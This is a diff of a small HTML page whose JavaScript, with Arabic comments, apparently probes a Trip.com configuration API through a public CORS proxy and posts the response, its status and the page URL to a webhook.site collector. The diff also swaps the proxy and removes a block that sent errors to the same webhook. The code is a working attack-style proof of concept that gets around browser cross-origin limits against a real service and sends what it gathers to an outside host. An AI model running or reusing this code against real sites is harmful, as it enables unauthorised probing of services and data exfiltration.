@@ -8,16 +8,16 @@
 
 <script>
 
-// ===== رابط webhook.site لإرسال الرد إليه =====
+// ===== رابط webhook.site لإرسال الرد إليه (اختياري) =====
 const TARGET_URL = "https://webhook.site/2bef5d8a-4a84-4ab7-8e71-ef2f512aa556";
 
-// ===== استخدم Proxy لتجاوز CORS =====
-const PROXY_URL = "https://api.allorigins.win/raw?url=";
+// ===== استخدم Proxy جديد =====
+const PROXY_URL = "https://cors-anywhere.herokuapp.com/";
 
 // ===== الطلب إلى Trip.com عبر Proxy =====
 const TRIP_API = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https://omar.trip.com";
 
-fetch(PROXY_URL + encodeURIComponent(TRIP_API), {
+fetch(PROXY_URL + TRIP_API, {  // ملاحظة: لم نعد نستخدم encodeURIComponent
     method: "POST",
     headers: {
         "Content-Type": "application/json"
@@ -41,15 +41,13 @@ fetch(PROXY_URL + encodeURIComponent(TRIP_API), {
 
 // ===== معالجة الرد من Trip.com =====
 .then(async r => {
-    // قراءة الرد
     const status = r.status;
     const responseText = await r.text();
     
-    // عرض النتيجة في الصفحة
     document.getElementById("result").textContent =
     "Status: " + status + "\n\n" + responseText;
     
-    // ===== إرسال الرد إلى webhook.site =====
+    // ===== إرسال الرد إلى webhook.site (اختياري) =====
     try {
         await fetch(TARGET_URL, {
             method: "POST",
@@ -65,13 +63,11 @@ fetch(PROXY_URL + encodeURIComponent(TRIP_API), {
                 url: window.location.href
             })
         });
-        
         document.getElementById("result").textContent += 
         "\n\n✅ تم إرسال البيانات إلى webhook.site";
-        
     } catch(forwardError) {
         document.getElementById("result").textContent += 
-        "\n\n❌ فشل إرسال البيانات إلى webhook.site";
+        "\n\n❌ فشل إرسال البيانات إلى webhook.site (غير مهم)";
     }
 })
 
@@ -79,24 +75,6 @@ fetch(PROXY_URL + encodeURIComponent(TRIP_API), {
 .catch(e => {
     document.getElementById("result").textContent =
     "Blocked:\n" + e;
-    
-    // إرسال الخطأ إلى webhook.site
-    try {
-        fetch(TARGET_URL, {
-            method: "POST",
-            mode: 'no-cors',
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                source: "trip.com",
-                error: e.toString(),
-                timestamp: new Date().toISOString()
-            })
-        });
-    } catch(forwardError) {
-        console.error("❌ فشل إرسال الخطأ:", forwardError);
-    }
 });
 
 </script>
